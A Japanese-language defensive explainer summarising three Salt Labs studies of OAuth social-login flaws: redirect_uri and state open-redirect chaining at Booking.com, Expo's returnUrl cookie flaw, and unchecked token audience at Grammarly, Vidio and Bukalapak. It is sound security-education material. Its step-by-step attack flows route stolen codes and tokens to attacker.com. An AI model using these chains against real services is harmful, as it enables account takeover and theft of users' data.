## Salt Labs の社会ログイン研究（access token 未検証の3部作）

このセクションでは、API セキュリティ企業 Salt Security の研究部門 **Salt Labs** が 2022〜2023 年にかけて公開した、ソーシャルログイン（「Facebook でログイン」「Google でログイン」といった、外部 ID プロバイダを使ったログイン機能）にまつわる OAuth 脆弱性の連続研究を扱う。3 本の記事は、いずれも「大手サービスがユーザー認証を外部の OAuth プロバイダに委任したときに、委任先から受け取った資格情報を**十分に検証していない**」という共通の失敗パターンを、異なる角度から突いている。

3 部作を貫くキーワードは次の 3 つである。

- **redirect_uri の検証不備**（第1弾 Booking.com）: トークンやコードの「返送先」を攻撃者が横取りできる。
- **返送先パラメータ（returnUrl）の早すぎる信頼**（第2弾 Expo）: 中継サービスが、ユーザー確認前に攻撃者指定の返送先を記憶してしまう。
- **access token の受信側検証欠如（token audience の未確認）**（第3弾 Grammarly/Vidio/Bukalapak）: 別アプリ向けに発行されたトークンを、そのまま自分のユーザーとして受け入れてしまう。

以下、防御の観点から、各記事の仕組みと根本原因を順に解説する。なお本セクションは既に修正済みの過去事例の解説であり、実在サービスや本番環境への無許可の検証手順を提供するものではない。

---

### 第1弾: Traveling with OAuth – Account Takeover on Booking.com（2023年3月）

#### 背景となる正常フロー

Booking.com は「Login with Facebook」に **認可コードグラント（Authorization Code Grant）** を採用していた。認可コードグラントとは、まずブラウザ経由で短命の「認可コード（code）」を受け取り、次にサーバー同士のバックチャネル通信で、そのコードとアプリの秘密鍵（app-secret）を引き換えに access token を取得する、OAuth の中でも比較的安全とされる方式である。

正常時の流れは次のとおり。

```
1. ユーザーが「Login with Facebook」をクリック
2. Booking が Facebook にリダイレクト:
   https://www.facebook.com/v3.0/dialog/oauth
     ?redirect_uri=https://account.booking.com/social/result/facebook
     &client_id=210068525731476
     &response_type=code
     &state=[値]
3. Facebook が認証後、code を付けて返送:
   https://account.booking.com/social/result/facebook?code={code}&state=[値]
4. Booking のバックエンドが app-secret を使い code を token に交換
5. Booking が Graph API でユーザーの email を取得
```

ここで `redirect_uri`（認可の結果を返す先の URL）と `state`（CSRF 対策と状態保持のためにアプリが自由に詰められる値）が攻撃の鍵になる。

#### 3 つの欠陥の連鎖

Salt Labs は、単独では致命的でない 3 つの欠陥を連鎖させて、アカウント乗っ取り（Account Takeover, ATO）を成立させた。

**欠陥1: redirect_uri のパス検証不足**
Facebook 側の設定は、`redirect_uri` の**オリジン**（`account.booking.com`）しか検証しておらず、**パス部分**は任意でよかった。つまり `https://account.booking.com/任意/攻撃者の/パス` のような URL でも Facebook がコード／トークンを返送してしまう。

> なぜそうなるか: OAuth の `redirect_uri` は本来「登録済みの正確な URL と完全一致」で検証すべきだが、多くのプロバイダは運用上の柔軟さのために「登録ドメイン配下ならパスは自由」というゆるい照合（プレフィックス／ドメイン一致）を許すオプションを持つ。この緩和が、後段の open redirect と結合した瞬間に致命傷になる。

**欠陥2: state 経由のオープンリダイレクト**
Booking の `/oauth2/authorize` エンドポイントは、`state` パラメータに **base64 エンコードされた JSON** を受け付けていた。その JSON には `mysettings_path` フィールドがあり、これが遷移先を決めていた。

```
state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ
```

これを base64 デコードすると：

```json
{"mysettings_path":"https://attacker.com/index.php","aid":"123"}
```

`mysettings_path` に攻撃者ドメインを入れると、ユーザーがそこへ遷移させられる。これが典型的な **オープンリダイレクト（サイトが任意の外部 URL へ無条件に転送してしまう欠陥）** である。

> なぜそうなるか: `state` は「アプリが自由に使ってよい不透明な値」であり、OAuth プロバイダは中身を検証しない。開発者がその中に「遷移先 URL」を入れ、しかも受信側でホワイトリスト検証せずに転送に使うと、`state` がそのままオープンリダイレクトの運び手になる。

**欠陥3: モバイルアプリのユーザー制御 redirect_uri**
モバイルアプリは `resultUri` というパラメータを受け取り、バックエンドの **トークン交換リクエスト**の `redirect_uri` として、ハードコードされた値の代わりに使っていた。Facebook はコードを token に交換する際、交換時の `redirect_uri` が認可時と一致するか照合するが、攻撃者が両方を自分の値に揃えられるため、この照合をすり抜けられた。

#### 攻撃の組み立て

3 つを連鎖させると次のようになる（要点のみ、防御理解のための概念図）。

```
Step1: Facebook URL の redirect_uri に、Booking のオープンリダイレクト(/oauth2/authorize)を仕込む
  https://www.facebook.com/v3.0/dialog/oauth
    ?redirect_uri=https://account.booking.com/oauth2/authorize?state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAifQ
    &response_type=code,token
    &client_id=210068525731476

Step2: 被害者がリンクを踏むと、Facebook が code/token をハッシュフラグメントで返送
  https://account.booking.com/oauth2/authorize#code=[秘密のコード]&access_token=[トークン]

Step3: オープンリダイレクトが、フラグメントごと攻撃者ドメインへ転送
  https://attacker.com/index.php#code=[秘密のコード]&access_token=[トークン]

Step4: 攻撃者の JavaScript がフラグメントから code を拾い、自分のサーバーへ送信
Step5: 攻撃者はモバイルアプリのトークン交換リクエストを傍受し、
       code を被害者のものに、resultUri を元の攻撃 URL に差し替えて成立させる
```

> なぜフラグメント（`#` 以降）が効くのか: URL のフラグメントはブラウザがサーバーに送らずクライアント側に保持する。リダイレクトが起きても多くのブラウザは**フラグメントを次の遷移先へ引き継ぐ**ため、`#access_token=...` は攻撃者ドメインまで運ばれ、そこの JavaScript が読み取れてしまう。`response_type=code,token` と指定して token も同時に吐かせている点にも注意。

#### 影響と修正

乗っ取りが成立すると、予約履歴・個人情報の閲覧、予約のキャンセル、タクシー手配などが可能になった。さらに Booking はアカウント連携を通じて **Kayak.com** にも波及し、Google など他プロバイダで作ったアカウントにも影響した。

修正は、OAuth プロバイダ設定で redirect_uri を**完全なパスまでハードコード**すること、ユーザー入力を遷移先に使わないこと、トークン交換前にすべての OAuth パラメータをサーバー側で検証することであった。

- 開示タイムライン: 発見 2022/11/10–21、報告 11/27、技術開示 12/4、修正確認 12/26。

> 出典: Traveling with OAuth – Account Takeover on Booking.com — https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com

---

### 第2弾: A New OAuth Vulnerability Impacts Hundreds of Online Services（CVE-2023-28131, CVSS 9.6, 2023年6月）

#### 対象: Expo の AuthSession Proxy

第2弾の標的は、個別サービスではなくフレームワーク側である。**Expo**（React Native アプリを素早く作るための開発プラットフォーム）が提供していた **AuthSession Proxy サービス（`auth.expo.io`）** が対象で、ライブラリ `expo-auth-session` に紐づく。CVE-2023-28131、CVSS スコアは **9.6（Critical）** が付与された。

このプロキシは、モバイルアプリの OAuth を楽にするための中継役である。モバイルアプリは固定の HTTPS URL を持ちにくい（ディープリンクのカスタムスキームなどを使う）ため、Expo が `auth.expo.io/@アカウント/プロジェクト` という共通の `redirect_uri` をいったん受け取り、そこから各アプリのディープリンクへトークンを転送する、という設計だった。

```
1. ユーザーがソーシャルプロバイダ（Facebook/Google 等）でログイン開始
2. redirect_uri=https://auth.expo.io/@account/project でプロバイダへ
3. プロバイダが auth.expo.io にトークンを返送
4. auth.expo.io がアプリのディープリンクへトークンを転送
```

#### 根本原因: returnUrl の早すぎる信頼

致命的だったのは、Expo が **`returnUrl` パラメータ**（トークンの最終転送先を指定する値）を、**ユーザーの確認前にクッキー `ru`（Return URL）へ書き込んでいた**点である。

> なぜそうなるか: 本来この種の中継は「このアプリにトークンを渡してよいですか？」とユーザーに確認し、承認後にはじめて転送先を確定すべきである。ところが Expo は確認画面を出す**前に**、URL の `returnUrl` をそのままクッキーに保存していた。攻撃者が事前に悪意ある `returnUrl` をクッキーに焼き付けておければ、その後の正規ログインで得たトークンが攻撃者ドメインへ飛ぶ。ここは「ユーザー入力（returnUrl）を、承認という信頼境界を越える前に永続化してしまった」典型的な設計ミスである。

さらに検証は**大文字小文字の細工**（`hTTps://` のように綴りを変える）で回避できたとされ、URL 検証ロジックの脆さも露呈した。

#### 攻撃手順

```
Step1（クッキー注入）: 攻撃者が victim に returnUrl=hTTps://attacker.com を含むリンクを送る。
  Expo は確認メッセージを出す前にクッキー ru を設定してしまう。

Step2（自動化）: JavaScript がポップアップを2つ開く。
  1つ目: 悪意ある return URL をあらかじめセットするためのウィンドウ
  2つ目: 正規の Facebook OAuth フロー

Step3（トークン窃取）: victim(Dan) が2つ目のリンクをクリック:
  https://www.facebook.com/v6.0/dialog/oauth
    ?redirect_uri=https://auth.expo.io/@moreisless3/me321&client_id=328...
  Facebook が token を付けて Expo に返送 → Expo は ru の値 https://attacker.com へ token を送る

Step4（乗っ取り）: 攻撃者は盗んだ token で正規ログインを開始し、
  自分のセッショントークンを victim のものに差し替える
```

#### 影響

`auth.expo.io` を使うすべてのアプリが潜在的な対象で、Salt Labs は **Codecademy（約1億ユーザー）** をはじめ、Expo フォーラムから **34 社以上**の利用サービスを特定した。Facebook・Google・Twitter など、連携先アカウントへの波及も可能だった。

#### 修正

- 2023/2/18: ユーザー承認なしにクッキーを設定しないよう暫定緩和（報告当日対応）。
- 2023/2/26: `auth.expo.io` AuthSession Proxy サービス自体を**非推奨（deprecated）化**。
- 各利用組織は、脆弱なプロキシを使わないよう自身のデプロイを更新する必要があった。

開示タイムライン: 発見 2023/1/24、緩和 2/18、サービス廃止 2/26、CVE 公開 4/24、一般公開 5/24。

> 出典: A New OAuth Vulnerability Impacts Hundreds of Online Services — https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services

---

### 第3弾: Oh-Auth – Abusing OAuth to take over millions of accounts（2024年）

#### この記事が扱う本質的な欠陥

第3弾は、3 部作の中で最も「原理そのもの」に踏み込む。標的は **Grammarly・Vidio・Bukalapak** の 3 社だが、真の主題は **access token の受信側検証欠如**、すなわち **token audience（トークンが本来どのアプリ向けに発行されたか）の未確認**である。

まず、implicit（トークン直返し）方式のソーシャルログインの正常フローを押さえる。

```
1. ユーザーが「Sign in with Facebook」をクリック
2. Facebook へ:
   https://www.facebook.com/v3.0/dialog/oauth
     ?redirect_uri=https://randomsite.com/OAuth
     &client_id=1501
     &state=[random]
     &response_type=token
3. Facebook が「そのアプリ ID 専用の」access token を生成
4. 返送: https://randomsite.com/OAuth#token=[秘密トークン]&state=[random]
5. サイトが Graph API を呼ぶ:
   https://graph.facebook.com/me?fields=id,name,email&access_token=[秘密トークン]
6. Facebook がユーザーの identity（id/name/email）を返す
```

ここで決定的なのは、**Facebook が発行する access token は「特定のアプリ ID（App ID）専用」である**という事実だ。Facebook の公式ドキュメントは、開発者が token を受け入れる前に **`debug_token` API** を使って検証することを義務付けている。この検証を怠り、「トークンで Graph API を呼べたから本人だ」と判断すると、**別アプリ向けのトークンでも通ってしまう**。

> なぜ audience 検証が必須なのか: OAuth の access token は「誰が（ユーザー）」「どのアプリに（App ID = audience）」「何を許可したか」を束ねた資格情報である。受信側が audience（App ID）を確認しないと、攻撃者が**自分のアプリ**でユーザーから正規に取得したトークンを、**別のサービス**に持ち込んで「このユーザー」として振る舞える。トークン自体は本物なので、単に Graph API が成功したかどうかでは真贋を判定できない。`debug_token` はトークンに紐づく App ID を返すため、それが自分の App ID と一致するかで audience を検証できる。

#### 攻撃手順（トークンの使い回し）

```
Step1（トークン収集）: 攻撃者が正規の OAuth 連携を備えた偽サイト
  （例: YourTimePlanner.com, App ID 328...）を用意。
  訪問ユーザーが Facebook ログインすると、攻撃者の App ID 向けトークンが発行される。

Step2（トークン再利用）: 攻撃者は集めたユーザートークンを、脆弱なサイトの
  ログインエンドポイントに送り込む。受信側が App ID を検証しないため、
  「そのユーザー」としてログインが成立する。
```

前提条件は「被害者が一度は攻撃者サイトで Facebook ログインしていること」「被害者が同じ email で対象サービスにアカウントを持つこと」。それ以降は追加操作なしで乗っ取れる。

#### サイト別の詳細

**Vidio.com（月間1億ユーザー）**
- エンドポイント: `/api/facebook/auth`
- 欠陥: token audience の未検証。
- 攻撃: YourTimePlanner（App ID 328..）で得たトークンを、App ID 92356 を期待する Vidio に送信 → 完全な乗っ取り成立。

**Bukalapak.com（1.5億ユーザー）**
- エンドポイント: `accounts.bukalapak.com` の `/fb_login`
- 欠陥: トークン検証の欠如。EC プラットフォームの個人・金融情報にアクセス可能。
- 修正後: 二次防御として **OTP（ワンタイムパスワード）** を追加。

**Grammarly.com（日次3000万ユーザー）**
- 方式: implicit ではなく **認可コードフロー**（本来より安全で、直接 token ではなく code を使う）。
- 二次的欠陥: バックエンドが**別名のパラメータ**を受け入れていた。
- 攻撃: POST リクエストの `code` を `access_token` パラメータに差し替えると通った。総当たりで `tokens`, `facebookToken`, `FBToken`, `access_token`（成功）などを試し、受理される名前を発見。
- API: `https://auth.grammarly.com` がパラメータ操作に対して脆弱。ドキュメント閲覧を含む被害者データが露出。

> なぜ Grammarly が「本来安全なコードフロー」でも破れたのか: 認可コードフローは「ブラウザに token を出さず、code をサーバー間交換で token に変える」ため implicit より堅い。しかしバックエンドが「code でも access_token でも受け付ける」寛容な実装だと、implicit の弱点（audience 未検証のトークン受理）を裏口から呼び込んでしまう。**受け付ける入力の種類を仕様どおりに厳格化する**ことがいかに重要かを示す好例である。

#### 影響と規模

3 社合計で数億ユーザー規模が対象。Salt Labs は、同種の欠陥を抱えるサイトは**さらに数千**存在し、「追加で数十億のインターネットユーザーがリスクにさらされている」と推定した。

修正時期: Vidio 2023/6/15、Bukalapak 2023/6/16、Grammarly 2023/7/13。一般公開は 2023/10/24。

解決策は以下のとおり。

1. トークンの audience（App ID）を自分のアプリ ID と照合する。
2. Facebook の `debug_token` API を呼んで明示的に検証する。
3. 受け付ける OAuth パラメータを、ドキュメント記載の仕様に限定する（別名を受理しない）。

> 出典: Oh-Auth – Abusing OAuth to take over millions of accounts — https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts

---

### 3部作から学ぶ防御原則

3 本を横断すると、ソーシャルログインを実装する側が守るべき原則が浮かび上がる。

- **redirect_uri は完全一致で検証する。**（第1弾）オリジンやパスのプレフィックス一致で妥協せず、登録済み URL と厳密一致させる。ユーザー入力（`resultUri` 等）を交換時の `redirect_uri` に使わない。
- **`state` に遷移先 URL を詰めない／詰めるなら受信側でホワイトリスト検証する。**（第1弾）`state` は不透明な CSRF トークンであって、オープンリダイレクトの運び手にしない。
- **信頼境界（ユーザー承認）を越える前に、ユーザー入力を永続化しない。**（第2弾）`returnUrl` のような転送先はユーザー確認後に確定し、URL 検証は大文字小文字・エンコードの正規化まで行う。
- **受け取った access token は必ず audience を検証する。**（第3弾）`debug_token` 等で「そのトークンが自分の App ID 向けか」を確認する。Graph API が成功したことは本人性の証明にはならない。
- **受け付けるパラメータ名・種類を仕様どおりに厳格化する。**（第3弾）`code` を期待する口に `access_token` が通るような寛容さは、より安全なフローを台無しにする。

これらはいずれも「外部プロバイダから受け取ったものを、無検証で信頼しない」という一点に集約される。OAuth は認可を委任する仕組みであって、委任先からの応答を鵜呑みにしてよいという意味ではない、というのが Salt Labs 3 部作の一貫したメッセージである。
